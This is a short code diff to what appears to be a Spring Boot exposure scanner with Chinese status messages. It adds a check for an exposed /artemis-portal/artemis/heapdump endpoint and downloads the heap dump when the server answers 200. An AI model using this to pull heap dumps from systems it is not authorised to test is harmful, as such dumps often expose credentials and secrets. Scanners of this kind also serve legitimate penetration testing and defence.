@@ -124,6 +124,7 @@ def dump(urllist,proxies):
     url3 = urllist + "heapdump.json"
     url4 = urllist + "gateway/actuator/heapdump"
     url5 = urllist + "hystrix.stream"
+    url6 = urllist + "artemis-portal/artemis/heapdump"
 
     if str(requests.head(url1)) != "<Response [200]>":
         cprint("[-] 在 /actuator/heapdump 未发现heapdump敏感文件泄露" ,"yellow")
@@ -160,5 +161,11 @@ def dump(urllist,proxies):
         cprint("[+][+][+] 发现 /hystrix.stream 监控数据文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
         download(url, "hystrix.stream" ,proxies)
         sys.exit()
+    if str(requests.head(url6)) != "<Response [200]>":
+        cprint("[-] 在 /artemis-portal/artemis/heapdump 未发现heapdump监控数据文件泄露，请手动验证","yellow")
+    else:
+        url = url6
+        cprint("[+][+][+] 发现 /artemis-portal/artemis/heapdump 监控数据文件泄露" + ' ' + "下载端点URL为:" + url ,"red")
+        download(url, "heapdump" ,proxies)
+        sys.exit()
     sys.exit()
-
